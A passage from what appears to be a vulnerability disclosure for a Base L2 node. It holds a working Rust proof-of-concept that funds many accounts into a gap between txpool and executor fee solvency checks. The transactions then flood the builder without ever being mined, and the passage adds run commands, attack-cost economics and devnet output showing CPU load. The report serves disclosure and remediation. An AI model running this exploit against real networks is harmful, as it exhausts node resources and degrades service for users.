  --docker-container NAME     Sample docker stats for this container, or 'none' (default: {DEFAULT_DOCKER_CONTAINER})
  --no-cleanup                Leave the attack txs in the txpool after observation
  --help                      Show this message"
    );
}

fn next_arg(args: &mut impl Iterator<Item = String>, flag: &str) -> Result<String> {
    args.next().with_context(|| format!("missing value for {flag}"))
}

fn load_chain_spec(path: &PathBuf) -> Result<BaseChainSpec> {
    let genesis_json =
        fs::read(path).with_context(|| format!("failed to read {}", path.display()))?;
    let genesis: Genesis = serde_json::from_slice(&genesis_json)?;
    Ok(BaseChainSpec::from_genesis(genesis))
}

async fn ensure_funder_balance(
    provider: &RootProvider<Base>,
    address: Address,
    senders: usize,
    min_per_sender: U256,
) -> Result<()> {
    let needed = min_per_sender.saturating_mul(U256::from(senders));
    let balance = provider.get_balance(address).await?;
    ensure!(
        balance >= needed,
        "funder balance {} is below required seed capital {}",
        format_ether(balance),
        format_ether(needed),
    );
    Ok(())
}

async fn build_attack_plans(
    opts: &Options,
    rpc_client: &HttpClient,
    chain_spec: &BaseChainSpec,
    attackers: &[PrivateKeySigner],
    recipient: Address,
    chain_id: u64,
    max_fee_per_gas: u128,
    max_priority_fee_per_gas: u128,
    input: Bytes,
) -> Result<Vec<AttackPlan>> {
    let latest_timestamp = latest_block_timestamp(rpc_client).await?;
    let spec_id = OpSpecId::from_timestamp(chain_spec, latest_timestamp);
    ensure!(spec_id.is_enabled_in(OpSpecId::ISTHMUS), "operator fee is not active at latest block");

    let l1_block_info = fetch_l1_block_info(rpc_client).await?;
    let mut plans = Vec::with_capacity(attackers.len());

    for signer in attackers {
        let artifact = sign_eip1559(
            signer,
            chain_id,
            0,
            recipient,
            U256::ZERO,
            opts.gas_limit,
            max_fee_per_gas,
            max_priority_fee_per_gas,
            input.clone(),
        )?;

        let mut fee_info = l1_block_info.clone();
        let l1_data_fee = fee_info.calculate_tx_l1_cost(&artifact.raw, spec_id);
        let operator_fee =
            fee_info.operator_fee_charge(&artifact.raw, U256::from(artifact.gas_limit), spec_id);
        ensure!(!operator_fee.is_zero(), "operator fee is zero; PoC condition not met");

        let validation_total = artifact.tx_cost.saturating_add(l1_data_fee);
        let execution_total = validation_total.saturating_add(operator_fee);
        let margin = operator_fee
            .checked_sub(U256::from(1u64))
            .unwrap_or(U256::ZERO)
            .min(U256::from(DEFAULT_OPERATOR_FEE_MARGIN_WEI));
        let desired_balance = validation_total.saturating_add(margin);

        ensure!(
            desired_balance < execution_total,
            "desired balance unexpectedly reaches executor solvency",
        );

        plans.push(AttackPlan {
            signer: signer.clone(),
            artifact,
            l1_data_fee,
            operator_fee,
            validation_total,
            execution_total,
            desired_balance,
        });
    }

    Ok(plans)
}

async fn send_seed_funding(
    provider: &RootProvider<Base>,
    funder: &PrivateKeySigner,
    chain_id: u64,
    max_fee_per_gas: u128,
    max_priority_fee_per_gas: u128,
    start_nonce: u64,
    plans: &[AttackPlan],
) -> Result<Vec<TxHash>> {
    let mut hashes = Vec::with_capacity(plans.len());
    let mut nonce = start_nonce;
    for chunk in plans.chunks(FUNDING_CHUNK_SIZE) {
        let mut chunk_hashes = Vec::with_capacity(chunk.len());
        for plan in chunk {
            let raw = sign_eip1559(
                funder,
                chain_id,
                nonce,
                plan.signer.address(),
                plan.desired_balance,
                21_000,
                max_fee_per_gas,
                max_priority_fee_per_gas,
                Bytes::new(),
            )?;
            nonce += 1;
            let pending = provider.send_raw_transaction(&raw.raw).await?;
            let hash = *pending.tx_hash();
            chunk_hashes.push(hash);
            hashes.push(hash);
        }
        wait_for_receipts(provider, &chunk_hashes, Duration::from_secs(90)).await?;
    }
    Ok(hashes)
}

async fn send_topups_if_needed(
    provider: &RootProvider<Base>,
    funder: &PrivateKeySigner,
    chain_id: u64,
    max_fee_per_gas: u128,
    max_priority_fee_per_gas: u128,
    start_nonce: u64,
    plans: &[AttackPlan],
) -> Result<Vec<TxHash>> {
    let mut hashes = Vec::new();
    let mut nonce = start_nonce;
    let mut pending_chunk = Vec::with_capacity(FUNDING_CHUNK_SIZE);
    for plan in plans {
        let current_balance = provider.get_balance(plan.signer.address()).await?;
        if current_balance >= plan.desired_balance {
            continue;
        }

        let delta = plan.desired_balance.saturating_sub(current_balance);
        let raw = sign_eip1559(
            funder,
            chain_id,
            nonce,
            plan.signer.address(),
            delta,
            21_000,
            max_fee_per_gas,
            max_priority_fee_per_gas,
            Bytes::new(),
        )?;
        nonce += 1;
        let pending = provider.send_raw_transaction(&raw.raw).await?;
        let hash = *pending.tx_hash();
        pending_chunk.push(hash);
        hashes.push(hash);

        if pending_chunk.len() == FUNDING_CHUNK_SIZE {
            wait_for_receipts(provider, &pending_chunk, Duration::from_secs(90)).await?;
            pending_chunk.clear();
        }
    }

    if !pending_chunk.is_empty() {
        wait_for_receipts(provider, &pending_chunk, Duration::from_secs(90)).await?;
    }
    Ok(hashes)
}

async fn ensure_gap_balances(provider: &RootProvider<Base>, plans: &[AttackPlan]) -> Result<()> {
    for plan in plans {
        let balance = provider.get_balance(plan.signer.address()).await?;
        ensure!(
            balance >= plan.validation_total,
            "sender {:#x} balance {} dropped below txpool validation total {}",
            plan.signer.address(),
            format_ether(balance),
            format_ether(plan.validation_total),
        );
        ensure!(
            balance < plan.execution_total,
            "sender {:#x} balance {} reached executor solvency {}",
            plan.signer.address(),
            format_ether(balance),
            format_ether(plan.execution_total),
        );
    }
    Ok(())
}

async fn send_attack_batch(
    provider: &RootProvider<Base>,
    plans: &[AttackPlan],
) -> Result<Vec<TxHash>> {
    let mut hashes = Vec::with_capacity(plans.len());
    for plan in plans {
        let pending = provider.send_raw_transaction(&plan.artifact.raw).await?;
        let hash = *pending.tx_hash();
        ensure!(
            hash == plan.artifact.hash,
            "raw submission hash mismatch: expected {:#x}, got {:#x}",
            plan.artifact.hash,
            hash,
        );
        hashes.push(hash);
    }
    Ok(hashes)
}

async fn wait_for_receipts(
    provider: &RootProvider<Base>,
    hashes: &[TxHash],
    timeout: Duration,
) -> Result<()> {
    let deadline = Instant::now() + timeout;
    let mut remaining: HashSet<TxHash> = hashes.iter().copied().collect();
    while !remaining.is_empty() {
        ensure!(Instant::now() < deadline, "timed out waiting for receipts");
        let pending: Vec<TxHash> = remaining.iter().copied().collect();
        for hash in pending {
            if provider.get_transaction_receipt(hash).await?.is_some() {
                remaining.remove(&hash);
            }
        }
        if !remaining.is_empty() {
            sleep(Duration::from_millis(500)).await;
        }
    }
    Ok(())
}

async fn latest_block_timestamp(rpc_client: &HttpClient) -> Result<u64> {
    let block: Value =
        ClientT::request(rpc_client, "eth_getBlockByNumber", rpc_params!["latest", false]).await?;
    let timestamp = block
        .get("timestamp")
        .and_then(Value::as_str)
        .ok_or_else(|| eyre::eyre!("latest block missing timestamp"))?;
    parse_u64_quantity(timestamp)
}

async fn latest_block_number(rpc_client: &HttpClient) -> Result<u64> {
    let block_number: String =
        ClientT::request(rpc_client, "eth_blockNumber", rpc_params![]).await?;
    parse_u64_quantity(&block_number)
}

async fn fetch_l1_block_info(rpc_client: &HttpClient) -> Result<L1BlockInfo> {
    let address = format!("{:#x}", Predeploys::L1_BLOCK_INFO);
    let l1_base_fee = read_storage_u256(rpc_client, &address, L1_BASE_FEE_SLOT).await?;
    let ecotone_scalars =
        read_storage_bytes(rpc_client, &address, ECOTONE_L1_FEE_SCALARS_SLOT).await?;
    let l1_blob_base_fee =
        read_storage_u256(rpc_client, &address, ECOTONE_L1_BLOB_BASE_FEE_SLOT).await?;
    let operator_fee_scalars =
        read_storage_bytes(rpc_client, &address, OPERATOR_FEE_SCALARS_SLOT).await?;

    let l1_base_fee_scalar =
        U256::from_be_slice(&ecotone_scalars[BASE_FEE_SCALAR_OFFSET..BASE_FEE_SCALAR_OFFSET + 4]);
    let l1_blob_base_fee_scalar = U256::from_be_slice(
        &ecotone_scalars[BLOB_BASE_FEE_SCALAR_OFFSET..BLOB_BASE_FEE_SCALAR_OFFSET + 4],
    );
    let operator_fee_scalar = U256::from_be_slice(
        &operator_fee_scalars[OPERATOR_FEE_SCALAR_OFFSET..OPERATOR_FEE_SCALAR_OFFSET + 4],
    );
    let operator_fee_constant = U256::from_be_slice(
        &operator_fee_scalars[OPERATOR_FEE_CONSTANT_OFFSET..OPERATOR_FEE_CONSTANT_OFFSET + 8],
    );
    let da_footprint_gas_scalar = Some(u16::from_be_bytes([
        operator_fee_scalars[DA_FOOTPRINT_GAS_SCALAR_OFFSET],
        operator_fee_scalars[DA_FOOTPRINT_GAS_SCALAR_OFFSET + 1],
    ]));

    Ok(L1BlockInfo {
        l2_block: None,
        l1_base_fee,
        l1_fee_overhead: None,
        l1_base_fee_scalar,
        l1_blob_base_fee: Some(l1_blob_base_fee),
        l1_blob_base_fee_scalar: Some(l1_blob_base_fee_scalar),
        operator_fee_scalar: Some(operator_fee_scalar),
        operator_fee_constant: Some(operator_fee_constant),
        da_footprint_gas_scalar,
        empty_ecotone_scalars: false,
        tx_l1_cost: None,
    })
}

async fn read_storage_u256(rpc_client: &HttpClient, address: &str, slot: U256) -> Result<U256> {
    let value = read_storage_value(rpc_client, address, slot).await?;
    parse_u256_quantity(&value)
}

async fn read_storage_bytes(
    rpc_client: &HttpClient,
    address: &str,
    slot: U256,
) -> Result<[u8; 32]> {
    let value = read_storage_value(rpc_client, address, slot).await?;
    parse_bytes32(&value)
}

async fn read_storage_value(rpc_client: &HttpClient, address: &str, slot: U256) -> Result<String> {
    let slot_hex = format!("0x{slot:064x}");
    ClientT::request(rpc_client, "eth_getStorageAt", rpc_params![address, slot_hex, "latest"])
        .await
        .wrap_err("eth_getStorageAt failed")
}

fn sign_eip1559(
    signer: &PrivateKeySigner,
    chain_id: u64,
    nonce: u64,
    recipient: Address,
    value: U256,
    gas_limit: u64,
    max_fee_per_gas: u128,
    max_priority_fee_per_gas: u128,
    input: Bytes,
) -> Result<SignedTxArtifact> {
    let tx_request = BaseTransactionRequest::default()
        .from(signer.address())
        .to(recipient)
        .value(value)
        .transaction_type(2)
        .with_gas_limit(gas_limit)
        .with_max_fee_per_gas(max_fee_per_gas)
        .with_max_priority_fee_per_gas(max_priority_fee_per_gas)
        .with_chain_id(chain_id)
        .with_nonce(nonce)
        .input(input.into());

    let tx = tx_request.build_typed_tx().map_err(|_| eyre::eyre!("invalid transaction request"))?;
    let tx_cost =
        value.saturating_add(U256::from(gas_limit).saturating_mul(U256::from(max_fee_per_gas)));
    let tx_gas_limit = tx.gas_limit();
    let signature = signer.sign_hash_sync(&tx.signature_hash())?;
    let signed_tx = tx.into_signed(signature);
    let hash = *signed_tx.hash();
    let raw: Bytes = signed_tx.encoded_2718().into();

    Ok(SignedTxArtifact { hash, raw, tx_cost, gas_limit: tx_gas_limit })
}

async fn count_known_statuses(rpc_client: &HttpClient, hashes: &[TxHash]) -> Result<usize> {
    let mut known = 0usize;
    for hash in hashes {
        let response: StatusResponse =
            ClientT::request(rpc_client, "base_transactionStatus", rpc_params![hash]).await?;
        if response.status == "Known" {
            known += 1;
        }
    }
    Ok(known)
}

async fn count_mined_receipts(provider: &RootProvider<Base>, hashes: &[TxHash]) -> Result<usize> {
    let mut mined = 0usize;
    for hash in hashes {
        if provider.get_transaction_receipt(*hash).await?.is_some() {
            mined += 1;
        }
    }
    Ok(mined)
}

async fn count_hashes_in_txpool(
    rpc_client: &HttpClient,
    attack_hashes: &HashSet<String>,
) -> Result<usize> {
    let content: Value = ClientT::request(rpc_client, "txpool_content", rpc_params![]).await?;
    let mut matches = HashSet::new();
    for subpool in ["pending", "queued"] {
        let Some(addresses) = content.get(subpool).and_then(Value::as_object) else {
            continue;
        };
        for nonces in addresses.values() {
            let Some(nonces) = nonces.as_object() else {
                continue;
            };
            for tx_value in nonces.values() {
                let Some(hash) = tx_value.get("hash").and_then(Value::as_str) else {
                    continue;
                };
                if attack_hashes.contains(hash) {
                    matches.insert(hash.to_string());
                }
            }
        }
    }
    Ok(matches.len())
}

async fn cleanup_attack_senders(rpc_client: &HttpClient, plans: &[AttackPlan]) -> Result<()> {
    for plan in plans {
        let sender = format!("{:#x}", plan.signer.address());
        let _: Vec<String> =
            ClientT::request(rpc_client, "admin_dropSenderTransactions", rpc_params![sender])
                .await?;
    }
    Ok(())
}

async fn sample_docker_stats(container: Option<&str>) -> Option<DockerStatsSample> {
    let container = container?.to_string();
    tokio::task::spawn_blocking(move || sample_docker_stats_blocking(&container))
        .await
        .ok()
        .flatten()
}

fn sample_docker_stats_blocking(container: &str) -> Option<DockerStatsSample> {
    let output = Command::new("docker")
        .args(["stats", container, "--no-stream", "--format", "{{.CPUPerc}}|{{.MemUsage}}"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8(output.stdout).ok()?;
    let line = stdout.lines().next()?.trim();
    let (cpu_raw, mem_raw) = line.split_once('|')?;
    Some(DockerStatsSample {
        cpu_percent: parse_percent(cpu_raw),
        mem_usage_bytes: parse_mem_usage(mem_raw),
        cpu_raw: Some(cpu_raw.to_string()),
        mem_raw: Some(mem_raw.to_string()),
    })
}

fn update_peak(peak: &mut DockerStatsPeak, sample: &DockerStatsSample) {
    if let Some(cpu) = sample.cpu_percent {
        if cpu > peak.cpu_percent {
            peak.cpu_percent = cpu;
            peak.cpu_raw = sample.cpu_raw.clone();
        }
    }

    if let Some(mem) = sample.mem_usage_bytes {
        if mem > peak.mem_usage_bytes {
            peak.mem_usage_bytes = mem;
            peak.mem_raw = sample.mem_raw.clone();
        }
    }
}

fn parse_percent(value: &str) -> Option<f64> {
    value.trim().strip_suffix('%')?.trim().parse().ok()
}

fn parse_mem_usage(value: &str) -> Option<u64> {
    let used = value.split('/').next()?.trim();
    parse_human_size(used)
}

fn parse_human_size(value: &str) -> Option<u64> {
    let value = value.trim();
    let split_idx =
        value.find(|ch: char| !(ch.is_ascii_digit() || ch == '.')).unwrap_or(value.len());
    let (number, unit) = value.split_at(split_idx);
    let number: f64 = number.parse().ok()?;
    let multiplier = match unit.trim().to_ascii_lowercase().as_str() {
        "b" => 1.0,
        "kb" | "kib" => 1024.0,
        "mb" | "mib" => 1024.0 * 1024.0,
        "gb" | "gib" => 1024.0 * 1024.0 * 1024.0,
        "tb" | "tib" => 1024.0 * 1024.0 * 1024.0 * 1024.0,
        _ => return None,
    };
    Some((number * multiplier) as u64)
}

fn parse_u64_quantity(value: &str) -> Result<u64> {
    Ok(u64::from_str_radix(value.trim_start_matches("0x"), 16)?)
}

fn parse_u256_quantity(value: &str) -> Result<U256> {
    Ok(U256::from_str_radix(value.trim_start_matches("0x"), 16)?)
}

fn parse_bytes32(value: &str) -> Result<[u8; 32]> {
    let bytes = hex::decode(value.trim_start_matches("0x"))?;
    ensure!(bytes.len() == 32, "expected 32-byte storage value, got {}", bytes.len());
    let mut out = [0u8; 32];
    out.copy_from_slice(&bytes);
    Ok(out)
}

fn format_ether(value: U256) -> String {
    let digits = value.to_string();
    if digits.len() <= 18 {
        let mut fraction = format!("{digits:0>18}");
        trim_fraction(&mut fraction);
        if fraction.is_empty() { "0".to_string() } else { format!("0.{fraction}") }
    } else {
        let split = digits.len() - 18;
        let whole = &digits[..split];
        let mut fraction = digits[split..].to_string();
        trim_fraction(&mut fraction);
        if fraction.is_empty() { whole.to_string() } else { format!("{whole}.{fraction}") }
    }
}

fn trim_fraction(fraction: &mut String) {
    while fraction.ends_with('0') {
        fraction.pop();
    }
}
```

**Attack Cost and Recoverability**\
The attack is primarily capital-backed, not gas-burning.

The bad attack transactions themselves are not mined, so they do **not** burn their advertised gas, L1 data fee, or operator fee. In the verified PoC:

* `attack_txs_mined = 0`
* `txpool_hash_hits = attack_txs_known`

That means the principal seeded into attacker EOAs remains attacker-owned.

The economics break down into three parts:

1. **Temporary locked capital**\
   The attacker must lock enough balance in each EOA to satisfy txpool solvency. That principal is recoverable in principle because the attack txs are never included.
2. **Unrecoverable setup / teardown fees**\
   Any included funding, top-up, cancel, or sweep transaction still pays normal on-chain fees. Those fees are not recoverable.
3. **Opportunity cost / operational friction**\
   While the bad tx remains pending, the account's nonce is occupied. Immediate recovery therefore requires a same-nonce replacement transaction, not a cheaper later nonce.

Txpool explicitly supports same-nonce replacement when the replacement is not underpriced:

```rust
// reth/crates/transaction-pool/src/pool/txpool.rs
// Transaction with the same nonce already exists: replacement candidate
let existing_transaction = entry.get().transaction.as_ref();
let maybe_replacement = transaction.as_ref();

if existing_transaction.is_underpriced(maybe_replacement, &self.price_bumps) {
    return Err(InsertErr::Underpriced { ... })
}

let replaced = entry.insert(pool_tx);
```

And the default replacement threshold for regular transactions is `10%`:

```rust
// reth/crates/transaction-pool/src/config.rs
pub const DEFAULT_PRICE_BUMP: u128 = 10;
```

So the attacker has two realistic recovery paths:

* **Passive recovery**: wait for the bad tx to leave the pool naturally (restart, eviction, or operator action), then reuse the principal. In this path the per-round unrecoverable cost can be near zero if the attacker already controls pre-funded EOAs.
* **Active recovery**: immediately replace each pending nonce-0 attack tx with a higher-priced same-nonce transaction and sweep funds back. In this path the recovery tx fees are unrecoverable.

Local PoC economics for the `128`-sender run, using the intentionally large devnet `operator_fee_constant = 1000000000000000`:

* seeded principal across attacker EOAs: `185753600000019200 wei` (`0.1857536000000192 ETH`)
* attack-tx fee burn: `0 wei` because none of the attack txs were mined
* approximate unrecoverable funding fees for `128` fresh EOAs: `136072064000000000 wei` (`0.136072064 ETH`)
  * this is `128 * (21000 * 3003000000 + operator_fee_constant)`, ignoring the tiny L1-data term
* approximate unrecoverable immediate-recovery fees with the default `10%` replacement bump: `136879270400000000 wei` (`0.1368792704 ETH`)
* approximate principal recoverable by immediate sweep after paying those recovery fees: `48874329600019200 wei` (`0.0488743296000192 ETH`)

Tha main impact of this issue is still "causing network processing nodes to process mempool transactions beyond intended solvency parameters", but it can be used in an adversarial way to exhaust computational resources.

To run the PoC:

{% stepper %}
{% step %}
Start the single-sequencer devnet with a non-zero operator fee:

```bash
env L2_OPERATOR_FEE_SCALAR=0 \
    L2_OPERATOR_FEE_CONSTANT=1000000000000000 \
    just devnet up-single
```

{% endstep %}

{% step %}
Wait until `just devnet status` shows the stack healthy.
{% endstep %}

{% step %}
Run the main E2E PoC:

```bash
env CARGO_TARGET_AARCH64_APPLE_DARWIN_RUSTFLAGS='-C link-arg=-fuse-ld=ld' \
  cargo run -p devnet --example h06_operator_fee_gap -- \
  --senders 128 \
  --call-data-bytes 8192 \
  --gas-limit 400000 \
  --observe-blocks 6
```

{% endstep %}

{% step %}
Optional stronger scaling run:

```bash
env CARGO_TARGET_AARCH64_APPLE_DARWIN_RUSTFLAGS='-C link-arg=-fuse-ld=ld' \
  cargo run -p devnet --example h06_operator_fee_gap -- \
  --senders 512 \
  --call-data-bytes 8192 \
  --gas-limit 400000 \
  --observe-blocks 4
```

{% endstep %}
{% endstepper %}

The PoC driver:

* reads the live fee scalars from `L1BlockInfo`;
* computes `validation_total` and `execution_total` for each signed raw tx;
* funds each random sender into the solvency gap;
* submits all attack txs to the builder RPC;
* polls:
  * `base_transactionStatus`
  * `eth_getTransactionReceipt`
  * `txpool_content`
  * `docker stats base-builder`
* drops the attacker senders from the txpool at the end.

The following contains output in local test:\
Representative output from the verified `128`-sender run:

```json
{
  "senders": 128,
  "attack_txs_known": 128,
  "attack_txs_mined": 0,
  "txpool_hash_hits": 128,
  "total_seed_balance_wei": "185753600000019200",
  "total_attack_raw_bytes": 1063424,
  "total_operator_fee_wei": "128000000000000000",
  "total_l1_data_fee_wei": "15616",
  "first_hash": "0x507182a6f7ae4807dfa29ec92d7002ab1d7b6e022c58666d1132653030ae3feb",
  "peak_builder_cpu": "55.59%",
  "peak_builder_mem": "538.3MiB / 11.65GiB"
}
```

Per-block samples from that same run:

```
block=282 known=128/128 mined=0 txpool_hits=128 cpu=23.55% mem=518.1MiB / 11.65GiB
block=284 known=128/128 mined=0 txpool_hits=128 cpu=38.06% mem=511MiB / 11.65GiB
block=285 known=128/128 mined=0 txpool_hits=128 cpu=21.49% mem=517.3MiB / 11.65GiB
block=286 known=128/128 mined=0 txpool_hits=128 cpu=23.29% mem=538.3MiB / 11.65GiB
block=287 known=128/128 mined=0 txpool_hits=128 cpu=19.73% mem=535MiB / 11.65GiB
block=289 known=128/128 mined=0 txpool_hits=128 cpu=55.59% mem=535.1MiB / 11.65GiB
```

Txpool-side proof:

```
WARN txpool: accepted tx whose balance passes txpool checks but fails executor max-fee solvency
tx_hash=0x507182a6f7ae4807dfa29ec92d7002ab1d7b6e022c58666d1132653030ae3feb
balance=1451200000000150
txpool_cost=1201200000000122
execution_cost=2201200000000122
l1_data_fee=122
operator_fee=1000000000000000
gas_limit=400000
```

Flashblocks-side execution proof:

```
DEBUG build_payload:build_flashblock: payload_builder: Considering transaction
tx_hash=0x507182a6f7ae4807dfa29ec92d7002ab1d7b6e022c58666d1132653030ae3feb
result=internal error: lack of funds (451200000000028) for max fee (1201200000000000)

TRACE build_payload:build_flashblock: payload_builder: skipping invalid transaction and its descendants
err=lack of funds (451200000000028) for max fee (1201200000000000)
```

Flashblock summary showing repeated full rejection with zero inclusion:

```
selection_outcome="pool_drained" rejection_reasons=["other"] txs_considered=128 txs_included=0 txs_rejected=128
```

That exact `128 considered / 0 included / 128 rejected` pattern appeared `76` times during the reproduced run.

Representative output from the verified `512`-sender run:

```json
{
  "senders": 512,
  "attack_txs_known": 512,
  "attack_txs_mined": 0,
  "txpool_hash_hits": 512,
  "total_seed_balance_wei": "743014400000062458",
  "total_attack_raw_bytes": 4253690,
  "total_operator_fee_wei": "512000000000000000",
  "total_l1_data_fee_wei": "62458",
  "first_hash": "0xa76f8bb78e55dce1a28ee10afa70749b9c83f32b9a3571bdade4240a21f99aaf",
  "peak_builder_cpu": "88.47%",
  "peak_builder_mem": "557.4MiB / 11.65GiB"
}
```

The strongest local CPU samples from that run were:

```
Builder baseline: cpu=6.99% mem=520.3MiB / 11.65GiB
block=393 known=512/512 mined=0 txpool_hits=512 cpu=70.04% mem=543.5MiB / 11.65GiB
block=395 known=512/512 mined=0 txpool_hits=512 cpu=88.47% mem=557.4MiB / 11.65GiB
block=396 known=512/512 mined=0 txpool_hits=512 cpu=69.45% mem=545.8MiB / 11.65GiB
block=398 known=512/512 mined=0 txpool_hits=512 cpu=78.59% mem=546.4MiB / 11.65GiB
```
